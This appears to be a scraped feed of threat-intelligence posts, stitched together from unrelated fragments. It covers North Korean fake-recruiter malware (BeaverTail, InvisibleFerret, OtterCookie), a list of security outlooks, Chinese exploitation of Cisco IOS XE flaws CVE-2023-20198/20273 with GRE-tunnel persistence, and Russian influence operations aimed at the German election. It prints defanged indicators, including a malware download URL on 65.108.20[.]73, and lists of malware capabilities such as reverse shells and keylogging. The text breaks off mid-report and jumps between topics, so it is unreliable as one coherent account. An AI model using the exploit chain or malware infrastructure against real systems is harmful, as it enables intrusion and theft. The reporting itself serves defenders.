        <p>The interviewer used a LinkedIn account with the name Javier Fiesco, who describes themself as the CTO of AgencyHill99. Further investigation into Javier Fiesco <a href="https://remote3.co/p/javier0923">uncovered</a> an individual with the same name available for work on remote3, a Web3 development job board. The website <em>agencyhill99[.]com</em> was registered on Hostinger on September 13, 2024. As of early February 2025, this website no longer resolved, but it previously <a href="https://urlscan.io/result/cf20d730-529f-42fe-b5dc-befb1d9b8a66">displayed</a> a Hostinger landing page. Research into AgencyHill99 uncovered a job <a href="https://www.levels.fyi/community/thread/GwOc95/we-are-looking-for-4-developers-who-can-develop-our-blockchain-project">posting</a> seeking a developer with blockchain knowledge on <em>levels[.]fyi</em>, with the following contact info:</p>
        <ul>
          <li>Contact us: <em>alexander@agencyhill99[.]com</em></li>
          <li>Recruiter: <em>vision.founder1004@gmail[.]com</em></li>
        </ul>
        <p>Pivoting on the text in the job description returned two private job postings on Upwork (<a href="https://www.upwork.com/en-gb/freelance-jobs/apply/Fullstack-Developer-Needed-React-Tailwind-CSS-Node-Web3-Expert_~021843580619016959863/">1</a>, <a href="https://www.upwork.com/en-gb/freelance-jobs/apply/Frontend-development-for-Token-Voting-Platform_~021844805127046769369/">2</a>). Additionally, a <a href="https://dorahacks.io/hacker/U_6b2d92accc9944/">profile</a> with the name of Lucifer, and what appears to be an AI-generated headshot, who works for AgencyHill99 was observed on the website DoraHacks, which is a hackathon, bounty, and grant organization. The profile on DoraHacks states that AgencyHill99 is looking to hire a developer. Insikt Group also discovered a <a href="https://intch.org/company/agencyhill99">company</a> with the name Agencyhill99 on the website Intch, a part-time and remote job platform. The company posted a “Part-Time IT Developer Opportunity” by an individual with the name Newton Curtis, who is a recruiter at AgencyHill99.</p>

          <li>On November 13, 2024, the Telegram user jaxtonhol posted in the Telegram channel “near_jobs” seeking blockchain engineers. The same user posted again on December 7, 2024, in the same channel with the email address <em>ysai@agencyhill99[.]com</em>.</li>
          <li>On November 30, 2024, a Telegram user posted asking if a job offer on LinkedIn from the account mentioned above, Javier Feisco associated with Agencyhill99, was legitimate and shared a screenshot of the message.</li>
        </ul>
        <p><strong>GitHub Repository</strong></p>
        <p>Insikt Group discovered a GitHub repository named agencyhill99 with the email address <em>admin@agencyhill99[.]com</em>. A GitHub user, dev-astro-star, made several commits to the repository between October 9 and 19, 2024. Based on the commits, it appears the website used Firebase, a Google backend service for web applications. The user added a button to download a file at the Google Drive link <em><a href="https://drive.google%5B.%5Dcom/uc?id=166zcmpqj-C7NPltm4iwRolz8XuxqZIXt">https://drive.google[.]com/uc?id=166zcmpqj-C7NPltm4iwRolz8XuxqZIXt</a></em>, which is no longer accessible. The email address <em>admin@agencyhill99[.]com</em> was also added to the repository, along with the Telegram channel <em>hxxps://t[.]me/+2AurfGZWxZo0MDgx</em>, which is also no longer live. The user also added a download link to <em>hxxp://65.108.20[.]73/BattleTank[.]exe</em>, which is no longer live and was later updated to <em>hxxp://65.108.20[.]73[:]3000/BattleTank[.]exe</em>. Port 3000 was open from October 20, 2024, to November 22, 2024, on <em>65.108.20[.]73</em>. The link was then updated to <em>hxxp://locahost[:]3000/BattleTank[.]rar</em>.</p>
        <h4>PurpleBravo Malware and Infrastructure</h4>
        <p>PurpleBravo uses the malware families BeaverTail, InvisibleFerret, and OtterCookie. BeaverTail is a malware family initially distributed via NPM packages as a JavaScript payload and later as executables and downloaders targeting Windows and macOS environments. BeaverTail also acts as an infostealer, gathering cryptocurrency wallet and browser information. InvisibleFerret is a collection of post-compromise payloads that collectively act as a backdoor in victim environments. InvisibleFerret introduces additional malicious payloads into victim environments, performs information stealing and fingerprinting actions within the victim environment, and leverages legitimate protocols and software for C2 communications. Like InvisibleFerret, OtterCookie is a post-compromise malware family used as a backdoor, which establishes C2 connectivity via Socket[.]IO, receives and executes shell commands from C2 servers, and exfiltrates sensitive victim data.</p>
        <p>Insikt Group analyzed BeaverTail, InvisibleFerret, and OtterCookie malware samples (See <strong>Appendix B</strong> for related file hashes). The BeaverTail samples were identified as PE variants targeting Windows environments. These samples included URLs linked to <em>freeconference[.]com</em>, a legitimate conferencing website, which aligns with Unit42’s <a href="https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/">findings</a> of Contagious Interview payloads posing as FreeConference executables. The OtterCookie samples were two separate versions of the malware family; however, static analysis of these samples included strings that demonstrated both samples’ ability to gather and send system fingerprinting information to attacker C2 servers, including strings that indicated OtterCookie is capable of identifying cryptocurrency assets and sensitive information found in specific file types by using regex patterns, including executables, photos, and config and env files, among others.</p>
        <p>The InvisibleFerret samples analyzed were Python scripts with the following functionalities:</p>
        <ul>
          <li>Determining victim device location via local IP address lookup</li>
          <li>Fingerprinting device details (user and hostname)</li>
          <li>Connecting to a Base64-encoded C2 address via HTTP POST requests</li>
          <li>Performing local directory discovery using hard-coded strings</li>
          <li>Creating a reverse shell for SSH session management and data exfiltration</li>
          <li>Copying clipboard data, keylogging, and tracking mouse movements.</li>
        </ul>
        <p>Previous samples of InvisibleFerret were <a href="https://www.zscaler.com/blogs/security-research/pyongyang-your-payroll-rise-north-korean-remote-workers-west">analyzed</a> by Zscaler, which described a two-part infection chain in which the initial reconnaissance took place over HTTP traffic and FTP was used for data exfiltration, as shown in <strong>Figure 2</strong>.</p>

        <p>Insikt Group identified 21 PurpleBravo servers between August 2024 and February 2025 (see <strong>Appendix B</strong> for the complete list). The majority of servers use Tier[.]Net hosting, with Majestic Hosting, Stark Industries, Leaseweb Singapore, and Kaopu Cloud HK also being used in this campaign. Insikt Group has previously observed other North Korean threat groups favor many of these hosting providers. In addition to the C2 servers, using Recorded Future Network Intelligence, Insikt Group observed at least seven suspected victims between September 2024 and February 13, 2025. The victims are located in at least six countries, including the United Arab Emirates, Costa Rica, India, Vietnam, Türkiye, and South Korea. Open-source <a href="https://spur.us/astrill-vpn-and-remote-worker-fraud/">research</a> identified Astrill VPN as a favored service by North Korean IT workers, with <a href="https://cloud.google.com/blog/topics/threat-intelligence/mitigating-dprk-it-worker-threat">evidence</a> that they use the service with remote administration tools. Insikt Group also observed network traffic between known Astrill VPN endpoints and PurpleBravo servers, corroborating this connection.</p>

        </div>
        <p>At least three victims in the cryptocurrency space were identified in the findings summarized below:</p>
        <ul>
          <li>On October 3, 2024, Insikt Group observed likely reconnaissance traffic between a BeaverTail C2 and a market-making company in the cryptocurrency space based in the United Arab Emirates. Shortly after the reconnaissance traffic, we observed likely exfiltration FTP traffic between the same IP addresses.</li>
          <li>On October 15, 2024, Insikt Group observed likely reconnaissance traffic between a BeaverTail C2 and a gambling company that offers online games and sells slot machines in the cryptocurrency space. The company is registered in Costa Rica. Reconnaissance traffic followed by FTP exfiltration traffic was observed between the C2 and the company's infrastructure on November 25 and 26, 2024.</li>
          <li>On October 2, 2024, Insikt Group observed potential FTP exfiltration traffic between a BeaverTail C2 and a software development company based in India that builds blockchain, AI, and mobile, among other applications.</li>
        </ul>

        </ul>
        <h2>Outlook #1: Expanding the cyber battlefield will put infrastructure at risk.</h2>
        <p>Cyber attacks are becoming the weapon of choice for disrupting (or threatening disruption) in rival nations even outside of conflict zones. This not only impacts critical infrastructure directly, but also could lead to secondary disruptions at organizations that depend on that infrastructure.</p>
        <h3>Real-world threats:</h3>
        <ul>
          <li>Volt Typhoon <a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a">pre-positioning</a> for disruptive attacks in energy, communications, and transportation sectors</li>
          <li>Pro-Russia hacktivists virtually <a href="https://www.cisa.gov/sites/default/files/2024-05/defending-ot-operations-against-ongoing-pro-russia-hacktivist-activity-508c.pdf">manipulating</a> operational technology systems</li>
        </ul>
        <h3>Priority actions:</h3>
        <p>CISOs must understand how geopolitical events affect their security posture to manage risk and communicate with their boards effectively.</p>
        <ul>
          <li>Use strategic foresight techniques, including <a href="https://www.theirm.org/media/7423/horizon-scanning_final2-1.pdf">Horizon Scanning</a>, <a href="https://www.rand.org/content/dam/rand/pubs/research_reports/RRA1900/RRA1959-1/RAND_RRA1959-1.pdf">PESTLE-M</a>, and <a href="https://www.secalliance.com/blog/applying-cone-of-plausibility-to-cti">the Cone of Plausibility</a>, to understand the external environment, anticipate what’s ahead, and make better intelligence-informed decisions</li>
          <li>Explore Recorded Future’s <a href="/products/geopolitical-intelligence">Geopolitical Intelligence Module</a>, which includes a Country Risk Scores help you understand and prioritize risks associated with operating in different countries.</li>
        </ul>
        <h2>Outlook #2: SaaS will make it easier to weaponize stolen credentials.</h2>
        <p>Cybercriminals are increasingly targeting interconnected software-as-a-service (SaaS) applications to gain access to enterprise ecosystems. With the average organization now using <a href="https://www.demandsage.com/saas-statistics/">approximately 371 SaaS apps</a>, and with <a href="https://blog.1password.com/verizon-data-breach-report-2024-analysis/#:~:text=use%20of%20stolen%20credentials%E2%80%9D%20is%20the%20number%20one%20initial%20action%20during%20breaches%2C%20and%20stolen%20credentials%20also%20account%20for%20a%20whopping%2077%25%20of%20Basic%20Web%20Application%20Attacks">77%</a> of SaaS app attacks beginning with stolen credentials, it’s essential to prioritize identity security.</p>
        <p>Credentials are frequently stolen by information-stealing malware, or infostealers, that are built to target a variety of operating systems and mobile devices. Per Recorded Future <a href="/research/2024-annual-report">research</a>, credential theft per device has risen 25% since 2021, increasing the risk of unlocking valuable corporate assets or credential stuffing attacks.</p>
        <h3>Real-world threats:</h3>
        <ul>
          <li>The recent high profile breaches have used credentials <a href="https://cloud.google.com/blog/topics/threat-intelligence/unc5537-snowflake-data-theft-extortion?utm_source=chatgpt.com">stolen</a> from infostealers from as far back as 2020 to gain access to over 165 companies’ cloud storage instances.</li>
          <li><a href="https://www.infosecurity-magazine.com/news/phishing-attack-bypasses-microsoft/">Even with MFA</a>, threat actors were able to use subtle social engineering strategies,to gain access to corporate systems.</li>
        </ul>
        <h3>Priority actions:</h3>
        <ul>
          <li>Consider AMFA with biometric authentication to provide an extra layer of protection from unauthorized access.</li>
          <li>Use Recorded Future’s <a href="/products/identity-intelligence">Identity Intelligence</a> Module to track stolen credentials for your organization</li>
          <li><a href="https://go.recordedfuture.com/demo?utm_id=24q1_gbl_mofu&amp;utm_source=blog&amp;utm_medium=blog&amp;utm_campaign=roleti_25otlk">Reach out</a> to learn more about your organization’s identity exposures with our free Exposure Assessment Report.</li>
        </ul>
        <h2>Outlook #3: Generative AI will transform social engineering.</h2>
        <p>The <a href="https://www.cnbc.com/2023/11/28/ai-like-chatgpt-is-creating-huge-increase-in-malicious-phishing-email.html">reported</a> 1,265% increase in phishing attacks between Q4 2022 and November 2023 has been attributed to the public release of LLMs like ChatGPT. Spear phishing attacks have become more dangerous now that threat actors can use generative AI to quickly create highly targeted and convincing messages as well as deepfake phone calls and videos (<a href="https://www.techtarget.com/searchsecurity/tip/Generative-AI-is-making-phishing-attacks-more-dangerous">TechTarget</a>).</p>
        <p>In addition to phishing, the increasing availability of sophisticated faceswap and other deepfake technology means more threat actors will be able to produce believable impersonations of company executives, celebrities, and political figures, pulling off increasingly costly scams.</p>
        <h3>Real-world threats:</h3>
        <ul>
          <li>Losses to impersonation scams <a href="https://www.ftc.gov/news-events/data-visualizations/data-spotlight/2024/04/impersonation-scams-not-what-they-used-be#:~:text=Scams%20that%20impersonate%20well%2Dknown,what%20consumers%20reported%20in%202020">topped</a> $1.1 billion in 2023.</li>
          <li><a href="/research/targets-objectives-emerging-tactics-political-deepfakes">26%</a> of politically themed deepfakes were used to commit fraud.</li>
        </ul>
        <h3>Priority actions:</h3>
        <ul>
          <li>Adapt phishing training to include detecting voice and video fraud</li>
          <li>Ensure processes for transferring money or data are resilient to scams by increasing validation checkpoints and educating employees on suspicious requests</li>
        </ul>
        <h2>Outlook #4: Regulatory demands and AI capabilities will push demand for safer code.</h2>
        <p>New regulations in both the US and EU are pushing software companies to prioritize security.

        <p>
          <img loading="lazy" alt="insikt group logo" src="https://www.recordedfuture.com/media_17759d8b91bf0c9106a0fa82007bef7e3316158b4.png?width=750&amp;format=png&amp;optimize=medium" width="300" height="48" />
        </p>
        <h2>Executive Summary</h2>
        <p>Between December 2024 and January 2025, Recorded Future’s Insikt Group identified a campaign exploiting unpatched internet-facing Cisco network devices primarily associated with global telecommunications providers. Victim organizations included a United States-based affiliate of a United Kingdom-based telecommunications provider and a South African telecommunications provider. Insikt Group attributes this activity to the Chinese state-sponsored threat activity group tracked by Insikt Group as RedMike, which aligns with the Microsoft-named group Salt Typhoon. Using Recorded Future® Network Intelligence, Insikt Group observed RedMike target and exploit unpatched Cisco network devices vulnerable to CVE-2023-20198, a privilege escalation vulnerability found in the web user interface (UI) feature in Cisco IOS XE software, for initial access before exploiting an associated privilege escalation vulnerability, CVE-2023-20273, to gain root privileges. RedMike reconfigures the device, adding a generic routing encapsulation (GRE) tunnel for persistent access.</p>
        <p>RedMike has attempted to exploit more than 1,000 Cisco devices globally. The group likely compiled a list of target devices based on their association with telecommunications providers' networks. Insikt Group also observed RedMike targeting devices associated with universities in Argentina, Bangladesh, Indonesia, Malaysia, Mexico, the Netherlands, Thailand, the United States (US), and Vietnam. RedMike possibly targeted these universities to access research in areas related to telecommunications, engineering, and technology, particularly at institutions like UCLA and TU Delft. In addition to this activity, in mid-December 2024, RedMike also carried out a reconnaissance of multiple IP addresses owned by a Myanmar-based telecommunications provider, Mytel.</p>
        <p>Unpatched public-facing appliances serve as direct entry points into an organization’s infrastructure. Sophisticated Chinese threat activity groups have <a href="https://go.recordedfuture.com/hubfs/reports/cta-2023-1107.pdf">shifted</a> heavily toward exploiting these devices for initial access over the past five years. RedMike’s exploitation of telecommunications infrastructure goes beyond technical vulnerabilities and represents a strategic intelligence threat. Persistent access to critical communications networks enables state-backed threat actors to monitor confidential conversations, manipulate data flows, and disrupt services during geopolitical conflicts. RedMike’s targeting of lawful intercept programs and US political figures highlights the strategic intelligence objectives behind these operations and the national security threat they pose.</p>
        <p>Organizations, particularly those in the telecommunications industry, must prioritize remediating exposed network devices, as unpatched systems remain a key initial access vector for Chinese state-sponsored threat activity groups. Network administrators should implement strict access controls, disable unnecessary web UI exposure, and monitor for unauthorized configuration changes. Individuals should use end-to-end encrypted communication methods for sensitive information, just as the Cybersecurity and Infrastructure Agency (CISA) and the Federal Bureau of Investigation (FBI) recommended, which is crucial to mitigate potential eavesdropping risks.</p>
        <p>Additionally, governments and cybersecurity entities should improve threat intelligence sharing and impose stricter regulatory compliance for network security. While the US sanctions on RedMike-affiliated Sichuan Juxinhe Network Technology signal a more assertive and commendable stance against state-backed cyber espionage in critical infrastructure, robust international cooperation is crucial for effectively countering these persistent threats.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>Despite significant media coverage and US sanctions, RedMike continues to compromise telecommunications providers globally, including in the US.</li>
          <li>RedMike compromised Cisco network devices of a US-based affiliate of a United Kingdom (UK) telecommunications provider and a South African telecommunications provider.</li>
          <li>RedMike exploited privilege escalation vulnerabilities CVE-2023-20198 and CVE-2023-20273 to compromise unpatched Cisco network devices running Cisco IOS XE software.</li>
          <li>Using Recorded Future Network Intelligence, Insikt Group identified RedMike attempting to exploit over 1,000 Cisco network devices between December 2024 and January 2025.</li>
        </ul>
        <h2>Background</h2>
        <p>In late September 2024, media reporting (<a href="https://www.wsj.com/politics/national-security/china-cyberattack-internet-providers-260bd835?st=cYA8J5&amp;reflink=desktopwebshare_permalink">1</a>, <a href="https://www.securityweek.com/chinas-salt-typhoon-hacked-att-verizon-report/">2</a>) stated that the Chinese state-sponsored group Salt Typhoon had compromised the networks of major US telecommunications companies, including Verizon (<a href="/research/redmike-salt-typhoon-exploits-vulnerable-devices?host=https%3A%2F%2Fwww.recordedfuture.com">1</a>), AT&amp;T, and Lumen Technologies. The activity likely affected telecommunications organizations globally, with some outlets <a href="https://www.politico.com/newsletters/national-security-daily/2024/12/12/we-need-to-talk-about-salt-typhoon-00183727">reporting</a> that Salt Typhoon compromised at least 80 organizations. SaltTyphoon used its access to telecommunications providers to snoop on <a href="https://www.darkreading.com/cyber-risk/salt-typhoon-apt-subverts-law-enforcement-wiretapping">US lawful intercept</a> targets and <a href="https://www.politico.com/news/2024/10/25/trump-hack-china-phones-00185608">intercept</a> the communications of significant US political figures. The effect of Salt Typhoon’s intrusions has reached the highest levels of the US government: Cybersecurity experts have <a href="https://www.reuters.com/world/us/us-agencies-brief-senators-chinese-salt-typhoon-telecom-hacking-2024-12-04/">briefed</a> the US Senate, CISA recently <a href="https://www.cisa.gov/resources-tools/resources/enhanced-visibility-and-hardening-guidance-communications-infrastructure">issued</a> guidance on hardening telecommunications infrastructure, and CISA and the FBI issued a joint <a href="https://www.forbes.com/sites/zakdoffman/2024/12/06/fbi-warns-iphone-and-android-users-stop-sending-texts/">warning</a> encouraging the use of encrypted end-to-end messaging applications for sensitive communications.</p>
        <p>Insikt Group tracks Salt Typhoon-aligned activity as RedMike. Salt Typhoon is a group name given by Microsoft Threat Intelligence; at this time, Microsoft has not published publicly available technical details of the group's activity. The only public information Microsoft has shared confirms an <a href="https://learn.microsoft.com/en-us/defender-xdr/microsoft-threat-actor-naming">overlap</a> with two existing threat activity group names: GhostEmperor (<a href="https://securelist.com/ghostemperor-from-proxylogon-to-kernel-mode/104407/">Kaspersky</a>) and FamousSparrow (<a href="https://www.welivesecurity.com/2021/09/23/famoussparrow-suspicious-hotel-guest/">ESET</a>).</p>
        <p>On January 17, 2025, the US Department of the Treasury’s Office of Foreign Assets Control (OFAC) <a href="https://home.treasury.gov/news/press-releases/jy2792">sanctioned</a> Sichuan-based cybersecurity company Sichuan Juxinhe Network Technology Co., Ltd. for their direct involvement with RedMike activity. OFAC stated that Sichuan Juxinhe Network Technology Co., Ltd. had direct involvement in exploiting US telecommunications and internet service provider companies. According to OFAC, China’s Ministry of State Security (MSS) has maintained strong ties with multiple computer network exploitation companies, including Sichuan Juxinhe.</p>
        <h2>Technical Analysis</h2>
        <h3>Cisco IOS XE Web UI Exploitation</h3>
        <p>Using Recorded Future Network Intelligence, Insikt Group identified that since early December 2024, RedMike has attempted to exploit over 1,000 internet-facing Cisco network devices worldwide, primarily those associated with telecommunications providers, using a combination of two privilege escalation vulnerabilities: CVE-2023-20198 and CVE-2023-20273. When successfully compromised, the group uses the new privileged user account to change the device's configuration and adds a GRE tunnel for persistent access and data exfiltration.</p>
        <p>The privilege escalation vulnerability CVE-2023-20198 was found in the Cisco IOS XE software web UI feature, version 16 and earlier, and <a href="https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z">published</a> by Cisco in October 2023. Attackers exploit this vulnerability to gain initial access to the device and issue a privilege 15 command to create a local user and password. Following this, the attacker uses the new local account to access the device and exploits an associated privilege escalation vulnerability, CVE-2023-20273, to gain root user privileges.</p>

          </div>
        </div>
        <p>More than half of the Cisco devices targeted by RedMike were in the US, South America, and India. The remaining devices spanned over 100 other countries. Although the selected devices are primarily associated with telecommunications providers, thirteen were linked to universities across Argentina, Bangladesh, Indonesia, Malaysia, Mexico, the Netherlands, Thailand, the US, and Vietnam.</p>
        <p>Often involved in cutting-edge research, universities are prime targets for Chinese state-sponsored threat activity groups to acquire valuable research data and intellectual property. Previous examples include APT40, which has <a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-200a">targeted</a> universities for biomedical, robotics, and maritime research; RedGolf (APT41) <a href="https://www.justice.gov/archives/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer">for</a> medical research; and RedBravo (APT31), which has directly <a href="https://www.reuters.com/technology/cybersecurity/apt31-chinese-hacking-group-behind-global-cyberespionage-campaign-2024-03-26/">targeted</a> academics. China’s cyber strategy <a href="https://go.recordedfuture.com/hubfs/reports/cta-2023-1107.pdf">aligns</a> with its broader economic and military goals, making universities high-value targets for long-term intelligence-gathering and technology acquisition.</p>
        <p>RedMike possibly targeted the following universities to access research in areas related to telecommunications, engineering, and technology, particularly at institutions like <a href="https://wireless.ee.ucla.edu/research/">UCLA</a> and <a href="https://www.tudelft.nl/onderwijs/opleidingen/masters/ee/msc-electrical-engineering/track-wireless-communication-and-sensing/related-research/">TU Delft</a>.</p>

          </div>
        </div>
        <p>RedMike’s scanning and exploitation activity occurred on six different occasions from December 2024 to January 2025.</p>
        <ul>
          <li>2024-12-04</li>
          <li>2024-12-10</li>

          <li>2025-01-23</li>
        </ul>
        <p>Network administrators operating a Cisco network device with IOS XE software web UI exposed to the internet can use the dates mentioned and advice in the mitigations section to identify potential RedMike exploitation activity.</p>
        <p>Using internet scanning data, Insikt Group identified more than 12,000 Cisco network devices with their web UIs exposed to the internet. Although over 1,000 Cisco devices were targeted, Insikt Group assesses that this activity was likely focussed, given that this number only represents 8% of the exposed devices and that RedMike engaged in periodic reconnaissance activity, selecting devices linked to telecommunications providers.</p>
        <h3>Compromised Telecommunications Provider Devices</h3>
        <p>Using Recorded Future Network Intelligence, Insikt Group observed seven compromised Cisco network devices communicating with RedMike infrastructure. These include devices associated with:</p>
        <ul>
          <li>A US-based affiliate of a UK telecommunications provider</li>
          <li>A US internet service provider (ISP) and telecommunications company</li>
          <li>A South African telecommunications provider</li>
          <li>An Italian ISP</li>
          <li>A large Thailand telecommunications provider</li>
        </ul>
        <p>RedMike configured GRE tunnels between the compromised Cisco devices and their infrastructure. GRE is a tunneling protocol used to encapsulate various network layer protocols inside point-to-point connections. It is a standard feature that can be configured on Cisco network devices. It is commonly used to create virtual private networks (VPNs), enable interoperability between different network types, and transport multicast or non-IP traffic over IP networks. Threat activity groups use GRE tunnels to maintain persistence by establishing covert communication channels that bypass firewalls and intrusion detection systems. These tunnels also facilitate stealthy data exfiltration by encapsulating stolen data within GRE packets, potentially bypassing network monitoring.</p>
        <h3>Reconnaissance of Myanmar Telecommunications Provider</h3>
        <p>In mid-December 2024, RedMike, from the same infrastructure that exploited the Cisco network devices, performed reconnaissance against multiple infrastructure assets operated by a Myanmar-based telecommunications provider, Mytel, likely including their corporate mail server.</p>

        </p>
        <h2>Executive Summary</h2>
        <p>The German federal elections, scheduled for February 23, 2025, are the target of malign influence operations linked to Russia and Russia-based actors. As of mid-February 2025, Insikt Group assesses that, despite their persistence, these efforts have very likely not meaningfully altered voter behavior or shaped public opinion in a manner advantageous to Russia’s broader geopolitical interests, consistent with <a href="https://www.brookings.edu/articles/the-impact-of-russian-interference-on-germanys-2017-elections/">assessments</a> of Russian meddling attempts in previous German election cycles.</p>
        <p>The influence operations and corresponding networks tracked in this report — Doppelgänger, Operation Overload, CopyCop, Operation Undercut, and the Russia-based Foundation to Battle Injustice — are longstanding and at least partially Kremlin-funded. These operations almost certainly seek to incite and escalate German domestic socio-political conflicts, pollute the German information space by introducing manipulated content, foster criticism of the United States (US) and European Union (EU) and European integration, and undermine North Atlantic Treaty Organization (NATO) cohesion in line with the Kremlin’s strategic objectives.</p>
        <p>The 2025 German election cycle marks a period of evolution for several of these operations, while core narratives remain unchanged. For example, Doppelgänger and Operation Overload have expanded beyond mainstream social media to Bluesky Social (Bluesky), in an attempt to capture migrating audiences. Doppelgänger and CopyCop have launched new brands and websites to project influence and reinforce messaging in the face of intensified scrutiny of their operations. Operation Overload continues to use artificial intelligence (AI)-based tools, including the use of AI-enabled voice cloning technology to create audio deepfakes, while both Operation Overload and Operation Undercut pose as real news organizations to increase their credibility.</p>
        <p>Despite limited evidence that these operations have meaningfully influenced voter behavior, they still pose broader risks to media integrity and public trust. Narratives undermining election security or integrity could reduce voter turnout, while media engagement with inauthentic content — rather than exposing the tactics behind it — may amplify malign messaging. Regarding Operation Overload specifically, we continue to assess that the potential for significant breakout does exist, as evidenced in the <a href="https://meduza.io/en/feature/2025/02/06/elon-musk-and-trump-jr-repost-fake-e-news-video-about-usaid-created-by-pro-kremlin-disinformation-network">viral spread</a> of a recent video attributed to this network that disparaged the United States Agency for International Development (USAID) in social media. To mitigate these risks, media entities, the public sector, and researchers should continue monitoring known influence networks while limiting engagement with operations such as Doppelgänger, Operation Overload, and Operation Undercut. Impersonated organizations should engage takedown services for malicious domains, collaborate with platform trust and safety teams, and proactively detect brand abuse tactics like typosquatting and logo manipulation.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>The German federal elections are the target of malign influence operations attributed to Russia and Russia-based actors.</li>
          <li>Russia-attributed influence operations have promoted and will very likely continue to support German political parties Russia views as beneficial to its own geopolitical interests, particularly Alternative für Deutschland (AfD).</li>
          <li>Doppelgänger is very likely exerting influence through at least seven new inauthentic news brands, in addition to the operation’s persistent media impersonation activities, to exacerbate political fissures and inflame political discourse surrounding European integration, immigration, and economic matters.</li>
          <li>Operation Overload’s media impersonations aim to sow distrust among German citizens toward the safety and integrity of voting, attack the characters of key political leaders, and present Germany as a rising hotbed of antisemitism and extremism.</li>
          <li>Insikt Group detected at least 94 new inauthentic websites –– whose creation began in November 2024 after the announcement of upcoming snap elections –– that we attribute to CopyCop impersonating German-language news websites.</li>
          <li>Following Insikt Group’s November 2024 investigation into Operation Undercut, we have observed the network continuing to post German-language content supporting AfD and undermining German Chancellor Olaf Scholz.</li>
          <li>The Foundation to Battle Injustice very likely seeks to undermine the reputations of German political leaders while promoting political platforms aligned with Russian interests through inauthentic investigative articles.</li>
        </ul>
        <h2>New Doppelgänger “Brands” Target Key German Election Issues</h2>
        <p>Insikt Group has detected at least eight new websites acting as original news brands, in addition to continued media impersonation with social media promotion, which we attribute to Doppelgänger, a longstanding Russian influence operation. <a href="https://www.disinfo.eu/doppelganger-operation/">Doppelgänger</a> is very likely positioning these newly established websites — previously not linked to the network — to sustain its influence operations targeting European political leadership and to exacerbate political fissures surrounding European integration, immigration, economic matters, and more. Throughout 2024, researchers, government entities, and technology companies <a href="https://www.qurium.org/alerts/exposing-the-evil-empire-of-doppelganger-disinformation/">continued</a> <a href="https://www.qurium.org/forensics/when-kehr-meets-vextrio/">exposing</a> Doppelgänger's activities across Europe and North America, leading to a US Department of Justice <a href="https://www.justice.gov/opa/pr/justice-department-disrupts-covert-russian-government-sponsored-foreign-malign-influence">indictment</a> against its operators at the Social Design Agency (SDA), international sanctions on SDA and affiliated entities, and at least partial — though often temporary — disruptions to its operations through takedowns and seizures. In response, SDA typically attempted to reestablish its operations within hours to days by deploying new infrastructure.</p>
        <p>While Doppelgänger is best known for the <a href="https://www.disinfo.eu/doppelganger/">direct impersonation</a> of legitimate Western media organizations, the influence operation has also managed a multitude of its own original news website “brands”, each targeting a specific country (such as Germany), with content directly tailored to the key domestic and foreign policy issues of that target audience, such as immigration policy, Germany’s ongoing socio-economic challenges, and questions of Germany’s place as Europe’s leader (as seen in <strong>Figure 1</strong>). Insikt Group has observed Doppelgänger abandoning several of its “legacy” brand websites with attempts to establish new brands, including multiple websites specific to German politics, likely due to a combination of repeated discovery and disruption of several of these websites.</p>
        <p>While we continue to observe Doppelgänger evolve its tactics and attempt to evade defenders, its ability to meaningfully impact public discourse very likely remains limited. Despite continued efforts to expand its network, Doppelgänger remains constrained by low levels of engagement, with minimal views and interactions across its newly launched domains and social media brands.</p>
        <h3>Using New Infrastructure to Deliver Old Themes</h3>
        <p>Since October 2024, Insikt Group has tracked a series of new domain registrations, discovering web page infrastructure that overlaps with previously attributed Doppelgänger-controlled domains. As of February 2025, Doppelgänger has registered ten domains that include eight new websites and two “parked” domains. The active domains reflect seven news brands that target German-speaking audiences:</p>

        <p>Similar to Doppelgänger’s legacy brands, these newly observed German-language sites each frame key socio-economic and political topics — such as Germany’s place in Europe, the state of the German economy, migration, and support to Ukraine — in ways that are highly relevant to German voters, reflecting thematic approaches seen in prior campaigns targeting elections in both France and the US. Specific examples include the Doppelgänger brand “Kriminal Radar”, which is used to provoke German fear over safety and security, and in particular fear toward migrants. Meanwhile, Östlicher Wind is an East Germany-oriented publication that promotes feelings of Euroskepticism, distrust toward the US and Ukraine, “traditional” values, and promotion of right-wing political entities, such as AfD.</p>

        <h3>Impersonating Media Organizations and Leveraging Social Media</h3>
        <p>In addition to establishing new news brands, Insikt Group identified Doppelgänger activity impersonating German media outlets DER SPIEGEL and Welt via the following domains: <em>spiegel[.]bz</em>, <em>welt[.]cx</em>, <em>welt[.]ink</em>, and <em>welt[.]pm</em>. Doppelgänger’s flagship influence outlet, Reliable Recent News (RRN), also continues publishing German-focused content via its website <em>rrn[.]com[.]tr</em>, on social media through the @RapidRespNews persona, and via its Telegram channel @reliablerecentnews.</p>

        </div>
        <p>Doppelgänger continues to create and operate mass social media accounts to disseminate its messages using domain obfuscation techniques Insikt Group <a href="/research/russian-influence-network-doppelgangers-ai-content-tactics">illustrated</a> in December 2023. Furthermore, Doppelgänger also continues to leverage various branded social media accounts that align with its Germany-oriented websites, including “Arbeitspause_1.0”, “Bayerischer Löwe”, and “Der Rattenfänger”. Many of these personas mirror Doppelgänger’s historical tactics, using localized narratives, falsified news formats, and networked amplification to increase credibility among target audiences. According to a January 2025 <a href="https://btw2025.cemas.io/artikel/update-doppelgaenger">analysis</a> by the German Center for Monitoring, Analysis, and Strategy (CeMAS), over 630 Doppelgänger-attributed social media posts occurred between December 2024 and January 2025, engaging in coordinated inauthentic behavior (CIB) and promoting non-credible narratives on German politics, economics, and immigration.</p>

            <content:encoded><![CDATA[
        <p>
          <img loading="lazy" alt="insikt-group-logo-updated-3-300x48.png" src="https://www.recordedfuture.com/media_17759d8b91bf0c9106a0fa82007bef7e3316158b4.png?width=750&amp;format=png&amp;optimize=medium" width="300" height="48" />
        </p>
        <h2>Executive Summary</h2>
